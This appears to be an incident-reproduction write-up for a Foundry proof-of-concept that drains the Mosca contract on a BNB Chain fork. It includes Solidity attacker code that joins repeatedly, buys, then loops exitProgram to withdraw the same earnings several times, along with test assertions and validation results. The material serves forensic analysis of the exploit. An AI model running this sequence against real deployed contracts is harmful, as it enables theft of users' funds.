# Mosca withdrawAll/exitProgram Drain PoC on BNB Chain

## 1. Overview & Context

This proof-of-concept (PoC) reproduces the Mosca withdrawAll/exitProgram accounting bug on a fork of BNB Chain. Starting from the pre-seed state described in the root cause analysis, a local attacker contract repeatedly invokes Mosca’s public user flows so that the same internal earnings are withdrawn multiple times without debiting user or admin balances. This causes a large drain of Mosca’s USDC-like and USDT reserves while Mosca’s internal accounting still reflects high liabilities.

The PoC targets the non-monetary ACT predicate from the incident:

- Mosca’s on-chain balances of USDC-like `0x8ac7…` and USDT `0x55d3…` drop significantly.
- The Mosca user representing the attacker sees `balanceUSDC` increase.
- The global `adminBalance` increases, so liabilities/fees are not reduced in line with reserves.

You can run the PoC with:

```bash
cd forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.bsc.quiknode.pro/<QUICKNODE_TOKEN>" forge test --via-ir -vvvvv
```

This uses a BNB Chain mainnet fork at block `45_519_930`, immediately before the real seed transaction.

## 2. PoC Architecture & Key Contracts

- **Mosca protocol contract** – `0x1962b3356122d6A56f978e112d14f5E23a25037D` on BNB Chain. Tracks users in a `User` struct and global `adminBalance` fields and exposes `join`, `buy`, `exitProgram`, and `withdrawAll`.
- **Stablecoins**
  - USDC-like token – `0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d`
  - USDT token – `0x55d398326f99059fF775485246999027B3197955`
- **Local attacker model**
  - `attackerEOA` – a fresh EOA generated via `makeAddr("attacker")` inside the test.
  - `AttackerOrchestrator` – a locally deployed helper contract defined in `src/AttackerOrchestrator.sol` that plays the role of the Mosca user being over-rewarded.

### 2.1 Main Test Contract

The main test lives in `test/Exploit.t.sol` as `MoscaExploitTest`. It configures the fork, sets labels, captures pre-state, and performs oracle checks.

Representative snippet (setup and attacker model):

```solidity
// test/Exploit.t.sol (setup excerpt)
uint256 internal constant BSC_CHAIN_ID = 56;
uint256 internal constant FORK_BLOCK = 45_519_930;

address internal constant MOSCA_ADDR = 0x1962b3356122d6A56f978e112d14f5E23a25037D;
address internal constant USDC_ADDR = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
address internal constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;

IMosca internal mosca = IMosca(MOSCA_ADDR);
IERC20 internal usdc = IERC20(USDC_ADDR);
IERC20 internal usdt = IERC20(USDT_ADDR);

address internal attackerEOA;
AttackerOrchestrator internal attackerContract;
```

*Snippet summary:* This defines the BNB Chain fork block, binds Mosca and the real USDC/USDT tokens, and introduces a fresh attacker EOA plus a local attack helper contract.

### 2.2 AttackerOrchestrator Contract

The attacker contract encodes the critical Mosca interaction pattern—multiple `join` calls, a `buy` in USDC mode, then repeated `exitProgram()` calls—without relying on the real on-chain orchestrator.

Core logic:

```solidity
// src/AttackerOrchestrator.sol (core exploit flow)
function executeExploit(
    uint256 joinAmount,
    uint256 buyAmount,
    uint256 joinCount,
    uint256 exitCount
) external {
    usdc.approve(address(mosca), type(uint256).max);

    for (uint256 i = 0; i < joinCount; ++i) {
        mosca.join(joinAmount, 0, 2, false);
    }

    mosca.buy(buyAmount, true, 3);

    for (uint256 i = 0; i < exitCount; ++i) {
        try mosca.exitProgram() {
            // keep looping while withdrawals succeed
        } catch {
            break;
        }
    }
}
```

*Snippet summary:* The contract repeatedly enrolls itself into Mosca’s reward queue, builds up a USDC-denominated balance, then loops `exitProgram()` to trigger multiple `withdrawAll(msg.sender)` payouts until the stablecoin transfers begin to fail.

## 3. Adversary Execution Flow

This section walks through the end-to-end ACT execution as implemented in the PoC.

### 3.1 Funding and Environment Setup

Within `setUp()` the test:

- Reads `RPC_URL` from the environment and creates a fork at block `45_519_930`.
- Sets the chain ID to `56` (BNB Chain).
- Labels the Mosca and token contracts for readable traces.
- Deploys a fresh `AttackerOrchestrator` and labels it as the Mosca user/attacker.
- Captures pre-state balances and accounting baselines for oracle checks.

Relevant excerpt:

```solidity
// test/Exploit.t.sol (setup balances and baselines)
usdcBefore = usdc.balanceOf(MOSCA_ADDR);
usdtBefore = usdt.balanceOf(MOSCA_ADDR);
assertGe(usdcBefore, 10_000e18);
assertGe(usdtBefore, 5_000e18);

IMosca.User memory attackerUserBefore = mosca.getUser(address(attackerContract));
attackerUserUSDCBefore = attackerUserBefore.balanceUSDC;
adminBalanceBefore = mosca.adminBalance();
```

*Snippet summary:* The test confirms Mosca’s USDC/USDT reserves are substantial and records the attacker user’s `balanceUSDC` and the global `adminBalance` before the exploit.

### 3.2 Deployment and Attacker Funding

In the main test function, the adversary is funded and the exploit parameters are derived:

```solidity
// test/Exploit.t.sol (parameter derivation and funding)
assertEq(address(usdc), USDC_ADDR);
assertEq(address(usdt), USDT_ADDR);

uint256 joinFee = mosca.JOIN_FEE();
uint256 joinAmount = joinFee * 3;
uint256 joinCount = 5;
uint256 buyAmount = 5_000e18;
uint256 exitCount = 5;

uint256 totalFunding = joinAmount * joinCount + buyAmount;
deal(USDC_ADDR, address(attackerContract), totalFunding);
deal(attackerEOA, 100 ether);
```

*Snippet summary:* The attacker contract is provisioned with enough USDC to perform several joins plus a large buy; the attacker EOA receives BNB for gas. The join and exit counts control how often `withdrawAll` can be exploited.

### 3.3 Exploit Steps

The attacker EOA calls into the local orchestrator, which then manipulates Mosca:

```solidity
// test/Exploit.t.sol (driving the attacker contract)
vm.startPrank(attackerEOA);
attackerContract.executeExploit(joinAmount, buyAmount, joinCount, exitCount);
vm.stopPrank();
```

This sequence corresponds to:

1. **Multiple joins** – the attacker contract calls `mosca.join` several times so its user entry is inserted into `rewardQueue` multiple times.
2. **USDC-denominated buy** – `mosca.buy` in USDC mode increases `user.balanceUSDC` for the attacker user.
3. **Looped exitProgram** – repeated `mosca.exitProgram()` calls cause `withdrawAll(msg.sender)` to execute multiple times against the same internal earnings, draining Mosca’s reserves.

The detailed trace in the Forge log shows successive `WithdrawAll` events for the attacker contract and large USDC/USDT transfers from Mosca to the attacker before transfers start reverting due to insufficient BEP20 balances.

### 3.4 Profit Realization and Post-State

After the attacker loop, the test records post-state values and computes deltas:

```solidity
// test/Exploit.t.sol (post-state and assertions)
uint256 usdcAfter = usdc.balanceOf(MOSCA_ADDR);
uint256 usdtAfter = usdt.balanceOf(MOSCA_ADDR);
uint256 adminBalanceAfter = mosca.adminBalance();

IMosca.User memory attackerUserAfter = mosca.getUser(address(attackerContract));
uint256 attackerUserUSDCAfter = attackerUserAfter.balanceUSDC;

uint256 usdcDrain = usdcBefore > usdcAfter ? usdcBefore - usdcAfter : 0;
uint256 usdtDrain = usdtBefore > usdtAfter ? usdtBefore - usdtAfter : 0;
```

*Snippet summary:* These variables capture the Mosca stablecoin reserves, the attacker user’s internal balance, and the protocol’s admin balance after the exploit. The computed drains are later checked against the oracle thresholds.

## 4. Oracle Definitions and Checks

The oracle specification in `artifacts/poc/oracle_generator/oracle_definition.json` defines variables, pre-checks, and constraints that must hold for a successful PoC. The test implements them as follows.

### 4.1 Variables

- `mosca` – the protocol contract at `0x1962…5037d`.
- `usdcToken` – USDC-like token at `0x8ac7…`.
- `usdtToken` – USDT token at `0x55d3…`.
- `attacker` – modeled as the local `AttackerOrchestrator` contract address.

The test binds these directly via `MOSCA_ADDR`, `USDC_ADDR`, `USDT_ADDR`, and `address(attackerContract)`.

### 4.2 Pre-Checks

The oracle requires Mosca to hold substantial stablecoin reserves before the exploit:

- USDC-like balance of Mosca ≥ `10_000e18`.
- USDT balance of Mosca ≥ `5_000e18`.

In the test, these are enforced in `setUp()`:

```solidity
// test/Exploit.t.sol (oracle pre-checks)
usdcBefore = usdc.balanceOf(MOSCA_ADDR);
usdtBefore = usdt.balanceOf(MOSCA_ADDR);
assertGe(usdcBefore, 10_000e18);
assertGe(usdtBefore, 5_000e18);
```

### 4.3 Hard Constraints

1. **Asset type constraint (HC-asset-type-1)**  
   The PoC must act specifically on USDC-like `0x8ac7…` and USDT `0x55d3…`.

   Implemented via:

   ```solidity
   assertEq(address(usdc), USDC_ADDR);
   assertEq(address(usdt), USDT_ADDR);
   ```

2. **User balanceUSDC increases (HC-accounting-user-balanceUSDC)**  
   After the exploit, the attacker’s `balanceUSDC` must strictly increase.

   Implemented via:

   ```solidity
   // before (setUp)
   IMosca.User memory attackerUserBefore = mosca.getUser(address(attackerContract));
   attackerUserUSDCBefore = attackerUserBefore.balanceUSDC;

   // after (test body)
   IMosca.User memory attackerUserAfter = mosca.getUser(address(attackerContract));
   uint256 attackerUserUSDCAfter = attackerUserAfter.balanceUSDC;
   assertGt(attackerUserUSDCAfter, attackerUserUSDCBefore);
   ```

3. **adminBalance increases (HC-accounting-adminBalance)**  
   Mosca’s global `adminBalance` must strictly increase across the exploit.

   Implemented via:

   ```solidity
   // baseline
   adminBalanceBefore = mosca.adminBalance();

   // post-state
   uint256 adminBalanceAfter = mosca.adminBalance();
   assertGt(adminBalanceAfter, adminBalanceBefore);
   ```

### 4.4 Soft Constraints

1. **USDC-like depletion (SC-victim-depletion-USDC)**  
   Mosca’s USDC-like balance must decrease by more than 1,000 tokens.

   Implemented via:

   ```solidity
   uint256 usdcDrain = usdcBefore > usdcAfter ? usdcBefore - usdcAfter : 0;
   assertGt(usdcDrain, 1_000e18);
   ```

2. **USDT depletion (SC-victim-depletion-USDT)**  
   Mosca’s USDT balance must decrease by more than 1,000 tokens.

   Implemented via:

   ```solidity
   uint256 usdtDrain = usdtBefore > usdtAfter ? usdtBefore - usdtAfter : 0;
   assertGt(usdtDrain, 1_000e18);
   ```

These constraints are calibrated to match the scale of the real incident (multi-million token drains) without requiring exact deltas.

## 5. Validation Result and Robustness

The validator re-ran the PoC using the QuickNode BNB endpoint and captured detailed traces. The Forge output shows:

- `MoscaExploitTest::test_Exploit_ReserveDrainAndAccountingMismatch()` passes.
- Multiple `Mosca::exitProgram()` and `WithdrawAll` events targeting the `AttackerOrchestrator` contract.
- Large ERC20 transfers of both USDC-like and USDT from Mosca to the attacker.

Summary of validation JSON (`artifacts/poc/poc_validator/poc_validated_result.json`):

- `overall_status`: `"Pass"` – the PoC runs successfully and satisfies all validation oracles.
- `poc_correctness_checks.passes_validation_oracles.passed`: `true` – pre-checks, hard constraints, and soft constraints from the oracle definition are all enforced and met.
- `poc_quality_checks`:
  - `oracle_alignment_with_definition.passed`: `true`
  - `human_readable_and_labeled.passed`: `true`
  - `no_magic_numbers_and_values_are_derived.passed`: `true`
  - `mainnet_fork_no_local_mocks.passed`: `true`
  - `self_contained_no_attacker_side_artifacts.*.passed`: all `true`
  - `end_to_end_attack_process_described.passed`: `true`
  - `alignment_with_root_cause.passed`: `true`

The Forge validator log is available at:

```bash
/home/ziyue/TxRayExperiment/incident-202512271020/artifacts/poc/poc_validator/forge-test.log
```

## 6. Linking PoC Behavior to Root Cause

The root cause report describes how an unprivileged orchestrator contract exploited Mosca’s `withdrawAll` and `exitProgram` logic to withdraw the same internal earnings multiple times, draining USDC-like and USDT reserves while Mosca’s accounting fields (user balances and `adminBalance`) did not decrease correspondingly.

The PoC captures this behavior as follows:

- **Adversary role and user mapping**
  - The real incident used a public orchestrator at `0x8512…` as the Mosca user being over-rewarded.
  - In the PoC, the `AttackerOrchestrator` contract plays the same role: it is the user address in Mosca’s `users` mapping whose `balanceUSDC` grows and is repeatedly withdrawn.

- **Building internal earnings**
  - Multiple `join` calls and a `buy` in USDC mode increase the attacker user’s balances in Mosca’s internal accounting.
  - This mirrors the seed transaction, where orchestrated flows created substantial internal earnings for the orchestrator address.

- **Exploiting withdrawAll / exitProgram**
  - Looped `exitProgram()` calls from the attacker contract trigger `withdrawAll(msg.sender)` multiple times while internal fields such as `balanceUSDC` are not decremented.
  - The trace shows multiple `WithdrawAll` events and large token transfers to the attacker, aligning with the incident’s repeated withdrawals for the same user.

- **State-level invariants and victim harm**
  - Mosca’s on-chain balances of the USDC-like and USDT tokens fall by well over 1,000 tokens each, confirming significant reserve loss.
  - At the same time, `user[address(attackerContract)].balanceUSDC` and `adminBalance` both strictly increase, demonstrating that liabilities and fees are not reconciled with the drained reserves.

This matches the non-monetary ACT predicate in the root cause report:

- The exploit causes a large net decrease in Mosca’s ERC20 holdings (USDC-like and USDT).
- There are no corresponding reductions in user/admin accounting fields, but rather increases in the attacker user’s balance and `adminBalance`.

By reproducing these conditions on a mainnet fork with a self-contained attacker model and explicit oracles, the PoC provides a robust, end-to-end demonstration of the Mosca withdrawAll/exitProgram accounting bug that led to the original incident. 

